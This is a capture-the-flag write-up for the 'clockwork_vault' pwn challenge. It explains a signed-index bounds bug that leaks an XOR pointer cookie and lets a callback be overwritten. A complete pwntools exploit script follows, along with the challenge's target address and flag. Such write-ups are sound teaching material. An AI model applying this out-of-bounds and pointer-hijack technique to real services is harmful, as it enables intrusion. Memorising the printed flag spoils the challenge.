# Clockwork Vault

## Meta

- Category: pwn
- Target: `10.112.0.12:41908`
- Binary: `clockwork_vault`
- Flag: `grodno{78b45c24-4bd7-4d89-a2a2-652b470af4c9}`

## Summary

The menu accepts signed indexes but only checks `idx <= 7`. Negative indexes are translated by `idx + 2`, which exposes two hidden slots before the visible mechanism array. Slot `-2` leaks `service_cookie`, and slot `-1` controls the callback used by the service cycle.

The callback pointers are XOR-encoded with `service_cookie`. After leaking the cookie and one encoded callback, the exploit writes a calibrated setting and an encoded `open_vault` pointer into slot `-1`, then runs the cycle.

## Steps

1. Inspect index `-2` to leak `service_cookie`.
2. Inspect index `-1` and `0` to recover the runtime addresses of `idle_cycle` and `trigger_alarm`.
3. Retune index `-1`:
   - setting: `0x43414c4942524154`
   - encoded routine: `service_cookie ^ open_vault`
4. Run the service cycle to print the flag.

## Exploit

```python
#!/usr/bin/env python3
import os
from pwn import *

context.binary = exe = ELF("./clockwork_vault", checksec=False)
context.log_level = "info"

HOST = os.getenv("HOST", "10.112.0.12")
PORT = int(os.getenv("PORT", "41908"))
MAGIC = 0x43414c4942524154

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process([exe.path])

io = conn()

def menu(choice):
    io.sendlineafter(b"> ", str(choice).encode())

def inspect(idx):
    menu(1)
    io.sendlineafter(b"Mechanism index:\n", str(idx).encode())
    io.recvuntil(b"Setting: ")
    setting = int(io.recvline().strip(), 16)
    io.recvuntil(b"Encoded routine: ")
    encoded = int(io.recvline().strip(), 16)
    return setting, encoded

def retune(idx, setting, encoded_routine):
    menu(2)
    io.sendlineafter(b"Mechanism index:\n", str(idx).encode())
    io.sendlineafter(b"New setting:\n", hex(setting).encode())
    io.sendlineafter(b"New encoded routine:\n", hex(encoded_routine).encode())

cookie, _ = inspect(-2)
_, encoded_idle = inspect(-1)
_, encoded_alarm = inspect(0)

runtime_idle = cookie ^ encoded_idle
runtime_alarm = cookie ^ encoded_alarm

alarm_to_open = exe.sym["open_vault"] - exe.sym["trigger_alarm"]
if runtime_alarm - runtime_idle == 0x15:
    alarm_to_open = 0x15

runtime_open_vault = runtime_alarm + alarm_to_open
retune(-1, MAGIC, cookie ^ runtime_open_vault)
menu(3)

print(io.recvall(timeout=2).decode("latin1"), end="")
```
